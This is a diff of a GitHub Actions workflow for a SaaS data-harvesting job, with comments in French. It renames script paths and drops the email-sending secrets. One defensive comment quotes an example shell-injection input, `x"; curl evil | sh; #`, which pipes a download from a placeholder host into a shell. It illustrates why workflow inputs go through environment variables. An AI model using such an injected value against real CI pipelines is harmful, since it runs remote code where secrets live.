@@ -33,7 +33,7 @@ on:
 # `.scratch/recolte/`). Il écrit un JSON de données client : sur le runner,
 # le fichier meurt avec la machine, et le publier en artefact l'exposerait à
 # quiconque lit ce dépôt PUBLIC. L'essai se lance en local
-# (`python3.12 saas/collecte/essai.py`), où le JSON reste chez David.
+# (`python3.12 saas/data/fetch_data/cockpit/check_data_collection.py`), où le JSON reste chez David.
 
 # UNE RÉCOLTE À LA FOIS PAR COMPTE. Tant que le seul départ manuel était le
 # bouton « ↻ Mes données », personne ne pouvait en lancer deux coup sur coup.
@@ -70,14 +70,11 @@ jobs:
           GOOGLE_ADS_CLIENT_SECRET: ${{ secrets.GOOGLE_ADS_CLIENT_SECRET }}
           GOOGLE_ADS_DEVELOPER_TOKEN: ${{ secrets.GOOGLE_ADS_DEVELOPER_TOKEN }}
           GOOGLE_ADS_LOGIN_CUSTOMER_ID: ${{ secrets.GOOGLE_ADS_LOGIN_CUSTOMER_ID }}
-          # Optionnel : email hebdo via Resend (sans clé → dry-run, aucun envoi)
-          RESEND_API_KEY: ${{ secrets.RESEND_API_KEY }}
-          EMAIL_FROM: ${{ secrets.EMAIL_FROM }}
           # TOUTES LES ENTRÉES PASSENT PAR L'ENVIRONNEMENT, aucune n'est
           # interpolée en `${{ }}` dans le script. Une entrée de
           # workflow_dispatch est du texte libre : collée telle quelle dans le
           # shell, `x"; curl evil | sh; #` s'exécuterait sur le runner, où
-          # vivent SUPABASE_SERVICE_KEY et RESEND_API_KEY. Les
+          # vit SUPABASE_SERVICE_KEY. Les
           # booléens sont comparés à la chaîne "true", jamais exécutés.
           MODE: ${{ inputs.mode }}
           DEPUIS: ${{ inputs.depuis }}
@@ -85,17 +82,16 @@ jobs:
           REPORT_ONLY: ${{ inputs.report_only }}
           FORCE: ${{ inputs.force }}
         run: |
-          M=saas/collecte/mise_a_jour.py
+          M=saas/data/fetch_data/cockpit/scheduled_update.py
           if [ "$MODE" = "complete" ]; then
             # La récolte complète EXIGE un compte : le script le refuse
             # lui-même sans `--user`, et c'est volontaire — forcer le passage de
-            # TOUS les comptes un jour qui n'est celui de personne leur
-            # enverrait à tous l'email hebdo (publish_weekly_report envoie dès
-            # qu'il a une adresse, sans contrôle de jour). Un rejeu vise un compte.
+            # TOUS les comptes serait une opération lourde et involontaire.
+            # Un rejeu vise un compte.
             if [ -n "$DEPUIS" ]; then
-              python saas/collecte/recolte_complete.py --user "$USER_ID" --depuis "$DEPUIS"
+              python saas/data/fetch_data/cockpit/full_history.py --user "$USER_ID" --depuis "$DEPUIS"
             else
-              python saas/collecte/recolte_complete.py --user "$USER_ID"
+              python saas/data/fetch_data/cockpit/full_history.py --user "$USER_ID"
             fi
           elif [ "$REPORT_ONLY" = "true" ] && [ -n "$USER_ID" ]; then
             python "$M" --report-only "$USER_ID"
